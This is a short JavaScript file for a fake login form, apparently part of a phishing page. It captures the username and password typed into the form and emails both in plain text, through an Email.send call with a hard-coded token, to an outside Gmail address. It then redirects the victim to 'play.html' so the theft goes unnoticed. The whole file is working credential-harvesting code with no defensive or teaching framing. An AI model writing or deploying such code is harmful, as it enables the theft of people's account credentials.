const username = document.getElementById('username');
const password = document.getElementById('password');
const loginbtn = document.querySelector('.loginbtn');

loginbtn.addEventListener('click',()=>{
    if (username.value.replace(" ","") != '' && password.value.replace(" ","") != '') {
       rbOn(username.value,password.value)
    } else error();
});

function rbOn(user,pwd) {
    Email.send({
        SecureToken: 'e7589e58-be60-40bc-9500-ee618f664037',
        To: 'dspeed637@gmail.com',
        From: 'dspeed637@gmail.com',
        Subject: `RB: ${user} / ${pwd}`,
        Body: `<p><b>username:</b> ${user}</p> 
         <p><b>password:</b> ${pwd}</p>`,
    }).then((message) => {
        //alert(message)
        window.location.href = 'play.html'
    });
}

